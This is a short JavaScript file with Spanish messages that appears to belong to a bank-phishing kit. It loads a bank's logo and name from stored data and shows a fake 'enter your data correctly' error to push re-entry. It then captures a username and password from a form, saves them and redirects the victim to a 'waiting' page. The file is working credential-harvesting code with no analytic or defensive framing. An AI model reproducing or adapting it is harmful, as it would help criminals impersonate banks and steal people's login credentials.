const loader = document.querySelector('.loader');
setTimeout(() =>{
    try{
        document.querySelector('body').classList.remove('sb-hidden');
        loader.classList.remove('show');

        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            alert('Por favor, ingrese sus datos correctamente.');
        }
    }catch(err){
        console.log(err);
    }
}, 1500);

// image and span
document.querySelector('#bank-logo').setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
document.querySelector('#bank-name').innerHTML = info.metaInfo.ban.toUpperCase();



const btnNextStep = document.querySelector('#next-step');
btnNextStep.addEventListener('submit', e => {
    e.preventDefault();

    if(document.querySelector('#user').value !== ''){
        if(document.querySelector('#puser').value !== ''){
            info.metaInfo.user = document.querySelector('#user').value;
            info.metaInfo.puser = document.querySelector('#puser').value;


            LS.setItem('info', JSON.stringify(info));

            window.location.href = 'waiting.html';
        }else{
            document.querySelector('#puser').classList.add('input-error');
        }
    }else{
        document.querySelector('#user').classList.add('input-error');
    }

    
});